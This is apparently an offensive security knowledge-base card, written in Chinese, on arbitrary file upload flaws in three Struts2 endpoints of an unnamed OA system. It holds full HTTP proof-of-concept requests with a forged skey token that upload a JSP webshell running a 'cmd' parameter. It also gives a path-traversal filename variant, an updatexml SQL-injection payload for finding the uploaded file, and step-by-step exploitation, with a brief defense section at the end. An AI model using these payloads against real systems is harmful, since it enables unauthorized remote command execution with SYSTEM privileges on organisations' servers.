---
id: web-generic-file-upload-oa-skey-filecase-netdisk-notice
title: OA 三处上传：原始文件名/后缀可控 + skey 伪造写入 JSP（filecase/netdisk/notice）
type: scenario
domain: web
path: web/generic/file-upload
technique: oa-skey-multipart-arbitrary-upload
tags:
- java
- struts2
- file-upload
- path-traversal
- webshell
- skey
- oa
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V32
  verified_at: '2026-11-05T06:02:31+08:00'
  notes: 已对照原文与截图核对：filecase/netdisk使用原始uploadFileName写入upfile/file_folder/年/月 与 upfile/file_netdisk/<dircode>；notice用getRandName+getFileExt后缀并写oa_notice_attach；三处shell.jsp均实测回显nt authority\system；skey校验与原文一致；原文未给产品版本；PoC未复现
url: /docs/web/generic/file-upload/web-generic-file-upload-oa-skey-filecase-netdisk-notice/
draft: false
kb_aliases:
- OA 任意文件上传
- filecase/upload 上传
- netdisk/upload 上传
- notice/add 上传
- UploadFileName 原始文件名
- FileUpload.getRandName 后缀可控
---

## 一句话结论

某 OA 的三个上传 Action 都存在可控文件名：`FilecaseUploadAction` 与 `NetdiskUploadAction` 直接使用 Struts2 的 `uploadFileName`（原始文件名）拼到 `upfile/file_folder/年/月/` 或 `upfile/file_netdisk/<dircode>/`，可上传 `.jsp` 并用 `../` 穿越；`NoticeAddAction` 虽用时间戳+随机数作文件名，但后缀取自原始文件名的最后一个 `.` 之后，仍可上传 `.jsp`，落盘路径为 `upfile/notice/年/月/`，文件名写入 `oa_notice_attach` 表，可配合 SQL 注入读取。前两处用可伪造的 `skey` 通过 `Privilege.Auth`。

## 原理

- **FilecaseUploadAction.execute**：`this.getUpload()` 取 multipart 文件数组；`real_path` 为 `Global.getRealPath() + cfg.get("file_folder") + "/" + 年 + "/" + 月`；`new FileOutputStream(real_path + File.separator + this.getUploadFileName()[i])`。`uploadFileName` 是客户端原始文件名，未做 `basename`/后缀检查，可含 `../`。路由为 `filecase/upload`，请求需 `skey`、`dircode`、`title`。
- **NetdiskUploadAction.execute**：`filepath = cfg.get("file_netdisk") + "/" + lf.getFilePath()`，`lf` 由 `dircode`（如 `admin`）对应的 `Leaf` 决定；落盘 `upfile/file_netdisk/<dircode>/<uploadFileName>`。同样使用原始文件名，路由 `netdisk/upload`，需 `skey`。
- **NoticeAddAction.execute**：`diskName = FileUpload.getRandName() + "." + StrUtil.getFileExt(this.getUploadFileName()[i])`；`getFileExt` 仅取最后一个 `.` 后的内容并转小写，因此原始文件名 `shell.jsp` 得到 `jsp` 后缀；落盘 `upfile/notice/年/月/<随机名>.jsp`。文件名随机，但 `NoticeAttachmentDb` 会把 `diskname`、`visual_path` 写入 `oa_notice_attach`，可用 SQL 注入读出。路由 `notice/add`。
- **skey 认证**：前两处 `Privilege.Auth(skey)` 用 `config_sso.xml` 中的 24 字节 3DES key 解密 `skey`，只校验 `用户名|毫秒时间戳` 且时间不超过 20 分钟；`getUserName` 取 `|` 前的用户名。密钥硬编码，可伪造 `admin|timestamp`（见关联卡）。
- **为什么 getshell**：上传目录 `upfile/...` 位于 Web 根下（`Global.getRealPath()`），容器解析 JSP；文件名/后缀可控，写入后直接访问执行。原文三处均验证了 `shell.jsp?cmd=whoami&pwd=pass` 返回 `nt authority\system`（Notice 处通过 SQL 注入取随机文件名后访问）。
- **路径穿越**：`uploadFileName` 未归一化，`../` 可逃逸到其他可写/可解析目录；Windows 同时接受 `\`/`/`。

## 触发条件

- 目标为使用该 OA 代码库的应用，存在 `filecase/upload`、`netdisk/upload`、`notice/add` 路由。
- 前两处需要有效 `skey`（可伪造）与 `dircode`（如 `camera`/`admin`）；`notice/add` 可能需要有效会话或 skey，按目标配置确认。
- 上传目录位于 Web 根下且允许 JSP 解析；应用进程对目录有写权限。
- 目标未对 `uploadFileName` 做 `basename`/后缀白名单/路径归一化。

## 利用步骤

1. 用 3DES key 生成 `admin|<当前毫秒>` 的 `skey`（见关联卡）。
2. **filecase**：POST `/oa/filecase/upload`，multipart 字段 `skey`、`dircode=camera`、`title`、`upload`（filename=`shell.jsp`，内容为 JSP）。响应成功；访问 `/oa/upfile/file_folder/<年>/<月>/shell.jsp?cmd=whoami&pwd=pass`。
3. **netdisk**：POST `/oa/netdisk/upload`，`skey`、`dircode=admin`、`title`、`upload`；访问 `/oa/upfile/file_netdisk/admin/shell.jsp?...`。
4. **notice**：POST `/oa/notice/add`，multipart `skey`、`title`、`content`、`isDeptNotice`、`upload`（filename=`shell.jsp`）；响应成功但文件名随机。用 SQL 注入查询 `oa_notice_attach.diskname`/`visual_path` 获取真实文件名，或按 `upfile/notice/<年>/<月>/` 目录爆破（随机数难度高，优先注入）。
5. 访问上传的 JSP 执行命令；验证权限（原文为 SYSTEM）。

## PoC

filecase 上传：

```http
POST /oa/filecase/upload HTTP/1.1
Host: target:8088
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCheck

------WebKitFormBoundaryCheck
Content-Disposition: form-data; name="skey"

E3FFCEF20E21F52B3168D99C1F620F58498C2AF158BC0259
------WebKitFormBoundaryCheck
Content-Disposition: form-data; name="dircode"

camera
------WebKitFormBoundaryCheck
Content-Disposition: form-data; name="title"

Test Upload
------WebKitFormBoundaryCheck
Content-Disposition: form-data; name="upload"; filename="shell.jsp"
Content-Type: application/octet-stream

<%@ page import="java.util.*,java.io.*" %><% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
------WebKitFormBoundaryCheck--
```

访问：

```http
GET /oa/upfile/file_folder/2026/1/shell.jsp?cmd=whoami&pwd=pass HTTP/1.1
Host: target:8088
```

netdisk 上传：同上，路由 `/oa/netdisk/upload`，`dircode=admin`，访问 `/oa/upfile/file_netdisk/admin/shell.jsp?...`。

notice 上传：

```http
POST /oa/notice/add HTTP/1.1
Host: target:8088
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNotice

------WebKitFormBoundaryNotice
Content-Disposition: form-data; name="skey"

E3FFCEF20E21F52B3168D99C1F620F58498C2AF158BC0259
------WebKitFormBoundaryNotice
Content-Disposition: form-data; name="title"

System_Update_Notice
------WebKitFormBoundaryNotice
Content-Disposition: form-data; name="content"

Notice_Content_Detail
------WebKitFormBoundaryNotice
Content-Disposition: form-data; name="isDeptNotice"

0
------WebKitFormBoundaryNotice
Content-Disposition: form-data; name="upload"; filename="shell.jsp"
Content-Type: application/octet-stream

<% ... %>
------WebKitFormBoundaryNotice--
```

读取文件名（SQL 注入）：

```text
orderBy=updatexml(1,concat(0x7e,(select diskname from oa_notice_attach limit 0,1),0x7e),1)
```

## 变体与关联

- **后缀**：`getFileExt` 只取最后一个 `.` 后的内容，`shell.jsp`、`shell.jspx`、`shell.JSP`（转小写）均可；双扩展名按最后一段判断。
- **路径穿越**：`uploadFileName=../../webapps/ROOT/shell.jsp` 可逃逸上传目录；按目标目录结构调整层级。
- **Notice 随机名**：`FileUpload.getRandName()` 不可预测，但数据库记录可读；也可结合文件读取/目录遍历获取。
- 关联卡片：[[web-generic-auth-oa-skey-3des-admin-token-forgery]]、[[web-generic-sqli-oa-jsp-orderby-sort-updatexml]]、[[web-generic-file-inclusion-oa-getfile-mappingaddress]]。

## 检测与防御

- **代码**：上传文件名只使用服务端生成名（UUID/哈希）+ 白名单后缀；`uploadFileName` 仅展示，不参与路径；`Path.normalize()` 后校验目标在上传目录内；`getFileExt` 白名单。
- **部署**：上传目录移出 Web 根或关闭 JSP 解析；限制 `upfile` 目录执行权限；对 `skey` 做服务端签名/短时令牌。
- **检测**：multipart 的 `filename`/`uploadFileName` 含 `.jsp`、`.jspx`、`../`；`upfile/file_folder`、`upfile/file_netdisk`、`upfile/notice` 下新增脚本；访问日志中出现刚上传文件的执行请求；`skey` 为固定 hex 且解密含 `admin|`。
- **应急**：删除恶意文件、隔离上传目录；轮换 3DES key；审计 `oa_notice_attach` 与上传记录；修复后回归正常附件上传。
